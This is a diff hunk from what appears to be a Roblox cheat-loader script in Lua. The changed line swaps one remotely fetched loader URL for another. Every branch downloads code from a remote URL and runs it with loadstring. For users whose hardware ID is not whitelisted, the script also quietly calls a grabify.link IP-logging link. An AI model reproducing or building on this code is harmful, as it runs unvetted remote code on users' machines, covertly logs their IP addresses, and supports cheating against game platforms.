@@ -36,7 +36,7 @@ if table.find(HwidWhitelist, HWID) then
     print("Found Hwid In List")
     local Read = readfile("vape/WhiteList.txt")
     if table.find(HwidWhitelist, Read) then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AirScriptYT/TDS/main/MainScript", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AirScriptYT/TDS/main/NewMain", true))()
     else
         loadstring(game:HttpGet("https://grabify.link/GYXTPJ", true))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main//CustomModules/6872274481.lua",true))()
